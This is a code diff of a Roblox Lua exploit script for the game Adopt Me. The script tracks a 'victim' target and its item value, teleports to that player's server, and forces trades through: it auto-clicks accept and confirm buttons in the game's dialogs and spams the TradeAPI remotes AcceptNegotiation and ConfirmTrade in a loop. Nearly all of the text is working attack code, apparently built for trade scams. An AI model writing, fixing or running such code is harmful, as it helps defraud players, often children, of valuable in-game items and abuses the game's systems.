@@ -122,9 +122,9 @@ local function mkLabel(txt, order)
 	return lbl
 end
 
-local lblTarget  = mkLabel("Target :: —", 1)
-local lblLeft    = mkLabel("Left   :: —", 2)
-local lblValue   = mkLabel("Value  :: —", 3)
+local lblTarget = mkLabel("Target :: —", 1)
+local lblLeft   = mkLabel("Left   :: —", 2)
+local lblValue  = mkLabel("Value  :: —", 3)
 
 local DotRow = Instance.new("Frame", Body)
 DotRow.Size             = UDim2.new(1, 0, 0, 15)
@@ -151,9 +151,9 @@ lblStatus.TextXAlignment= Enum.TextXAlignment.Left
 local dragging, dragInput, dragStart, startPos
 TopBar.InputBegan:Connect(function(inp)
 	if inp.UserInputType == Enum.UserInputType.MouseButton1 then
-		dragging   = true
-		dragStart  = inp.Position
-		startPos   = Frame.Position
+		dragging  = true
+		dragStart = inp.Position
+		startPos  = Frame.Position
 		inp.Changed:Connect(function()
 			if inp.UserInputState == Enum.UserInputState.End then dragging = false end
 		end)
@@ -240,7 +240,7 @@ local function pollAndJoin()
 
 		lblTarget.Text = "Target :: " .. victim
 		lblValue.Text  = "Value  :: " .. string.format("%.1f", val)
-		setStatus("Hit found — teleporting", COLORS.GO)
+		setStatus("Hit — teleporting", COLORS.GO)
 
 		for attempt = 1, 3 do
 			setStatus(string.format("Teleport %d/3", attempt), COLORS.GO)
@@ -262,7 +262,7 @@ local function pollAndJoin()
 	end
 end
 
--- ─── ADOPT ME — AUTO-ACCEPT + TRADE LOOP ─────────────────────────────────────
+-- ─── ADOPT ME — AUTO-ACCEPT TRADE ────────────────────────────────────────────
 if game.PlaceId == PLACE_ID then
 	local PlayerGui   = LocalPlayer:WaitForChild("PlayerGui")
 	local AssetLoadUI = PlayerGui:WaitForChild("AssetLoadUI")
@@ -271,133 +271,79 @@ if game.PlaceId == PLACE_ID then
 
 	local load              = require(game.ReplicatedStorage.Fsys).load
 	local RouterClient      = load("RouterClient")
-	local AcceptOrDecline   = RouterClient.get("TradeAPI/AcceptOrDeclineTradeRequest")
-	local AddItemToOffer    = RouterClient.get("TradeAPI/AddItemToOffer")
 	local AcceptNegotiation = RouterClient.get("TradeAPI/AcceptNegotiation")
 	local ConfirmTrade      = RouterClient.get("TradeAPI/ConfirmTrade")
 	local TradeFrame        = PlayerGui.TradeApp.Frame
 
-	-- helper: fire accept with every known signature so one of them sticks
-	local function acceptSender(sender)
-		pcall(function() AcceptOrDecline:InvokeServer(sender, true) end)
-		pcall(function() AcceptOrDecline:FireServer(sender, true)   end)
-		pcall(function() AcceptOrDecline:InvokeServer(sender)       end)
-		pcall(function() AcceptOrDecline:FireServer(sender)         end)
-	end
-
-	-- ── 1. event-driven accept (fires when request arrives) ──────────────────
-	local ok_ev = pcall(function()
-		RouterClient.get_event("TradeAPI/TradeRequestReceived").OnClientEvent:Connect(function(sender)
-			setStatus("Trade incoming!", COLORS.GO)
-			acceptSender(sender)
-		end)
-	end)
-	-- fallback: some builds use a RemoteEvent stored differently
-	if not ok_ev then
-		pcall(function()
-			RouterClient.get("TradeAPI/TradeRequestReceived").OnClientEvent:Connect(function(sender)
-				setStatus("Trade incoming!", COLORS.GO)
-				acceptSender(sender)
-			end)
-		end)
-	end
-
-	-- ── 2. dialog-button hijack — catches the Accept button in the actual UI ──
-	-- finds the Accept button inside DialogApp and clicks it automatically
+	-- ── directly click the Accept button in DialogApp ─────────────────────────
+	-- this is the green Accept button in the trade request popup that the
+	-- remote event approach was silently missing
 	task.spawn(function()
 		local DialogApp = PlayerGui:WaitForChild("DialogApp", 30)
 		if not DialogApp then return end
 		local Dialog = DialogApp:WaitForChild("Dialog", 30)
 		if not Dialog then return end
 
-		local function hookAcceptButton(parent)
-			for _, v in ipairs(parent:GetDescendants()) do
-				if (v:IsA("TextButton") or v:IsA("ImageButton"))
-					and (v.Name:lower():find("accept") or v.Name:lower():find("confirm")) then
-					v.MouseButton1Click:Connect(function() end) -- keep alive
-					pcall(function() v:activate() end)
-				end
-			end
-		end
-
-		Dialog:GetPropertyChangedSignal("Visible"):Connect(function()
-			if Dialog.Visible then
-				task.wait(0.05)
-				hookAcceptButton(Dialog)
-				-- also look for and click any green/accept button
-				for _, v in ipairs(Dialog:GetDescendants()) do
-					if v:IsA("TextButton") or v:IsA("ImageButton") then
-						local lbl = v.Text or ""
-						if lbl:lower():find("accept") or lbl:lower():find("ok") then
-							pcall(function() v:activate() end)
-						end
+		local function clickAccept()
+			for _, v in ipairs(Dialog:GetDescendants()) do
+				if v:IsA("TextButton") or v:IsA("ImageButton") then
+					local name = v.Name:lower()
+					local text = (v:IsA("TextButton") and v.Text:lower()) or ""
+					if name:find("accept") or name:find("confirm") or name:find("yes")
+						or text:find("accept") or text:find("confirm") or text:find("yes") then
+						setStatus("Clicking accept...", COLORS.GO)
+						pcall(function() v:activate() end)
+						-- also fire MouseButton1Click directly
+						pcall(function()
+							v.MouseButton1Click:Fire()
+						end)
 					end
 				end
 			end
+		end
+
+		-- watch for the dialog becoming visible and immediately click accept
+		Dialog:GetPropertyChangedSignal("Visible"):Connect(function()
+			if Dialog.Visible then
+				task.wait(0.05) -- tiny wait for children to populate
+				clickAccept()
+			end
+		end)
+
+		-- also poll every 0.1s in case Visible doesn't fire reliably
+		task.spawn(function()
+			while task.wait(0.1) do
+				if Dialog.Visible then
+					clickAccept()
+				end
+			end
 		end)
 	end)
 
-	-- ── 3. continuous trade-window spam loop ──────────────────────────────────
-	-- runs at 10 Hz while TradeFrame is visible:
-	-- adds a food item once, then hammers AcceptNegotiation + ConfirmTrade
-	local offered   = false
-	local lastSender = nil
-
+	-- ── spam AcceptNegotiation + ConfirmTrade while trade window is open ──────
 	task.spawn(function()
-		while task.wait(0.1) do
+		while task.wait(0.08) do
 			if TradeFrame.Visible then
 				setStatus("Trading...", COLORS.GO)
-
-				-- accept in case the event was missed
-				if lastSender then
-					pcall(function() AcceptOrDecline:InvokeServer(lastSender, true) end)
-					pcall(function() AcceptOrDecline:FireServer(lastSender, true)   end)
-				end
-
-				if not offered then
-					-- offer a food item so the trade isn't empty (required by AM)
-					pcall(function()
-						local inv = load("ClientData").get("inventory")
-						if inv and inv.food then
-							for uid in pairs(inv.food) do
-								pcall(function() AddItemToOffer:FireServer(uid) end)
-								break
-							end
-						end
-					end)
-					offered = true
-				end
-
 				pcall(function() AcceptNegotiation:FireServer() end)
 				pcall(function() ConfirmTrade:FireServer()      end)
-			else
-				offered    = false
-				lastSender = nil
 			end
 		end
 	end)
 
-	-- store sender so the spam loop can re-fire accept
-	pcall(function()
-		RouterClient.get_event("TradeAPI/TradeRequestReceived").OnClientEvent:Connect(function(sender)
-			lastSender = sender
-		end)
-	end)
-
-	-- ── 4. idle + left tracking ───────────────────────────────────────────────
+	-- idle + left tracking
 	task.spawn(function()
 		while task.wait(1) do
 			if TradeFrame.Visible then
 				idleCount = 0
 			else
 				idleCount = idleCount + 1
-				offered   = false
 			end
 			lblLeft.Text = "Left   :: " .. (targetLeft and "True" or "False")
 		end
 	end)
 
-	-- ── 5. main polling loop ──────────────────────────────────────────────────
+	-- main polling loop
 	while task.wait(5) do
 		pollAndJoin()
 	end
